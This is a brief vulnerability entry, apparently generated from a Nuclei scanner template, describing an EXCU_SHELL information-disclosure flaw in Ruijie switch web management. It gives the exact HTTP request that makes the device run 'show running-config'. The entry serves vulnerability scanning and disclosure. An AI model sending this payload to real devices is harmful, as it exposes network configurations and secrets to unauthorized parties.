# Vulnerability: Ruijie Switch Web Management System EXCU_SHELL - Information Disclosure
**Classification:** RUIJIE
**Source:** Nuclei Template (`ruijie-excu-shell.yaml`)

## Description
Ruijie switch WEB management system is vulnerable to an EXCU_SHELL information disclosure issue, potentially exposing sensitive system information to unauthorized parties.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /EXCU_SHELL HTTP/1.1
Host: {{Hostname}}
Cmdnum: '1'
Command1: show running-config
Confirm1: n
```

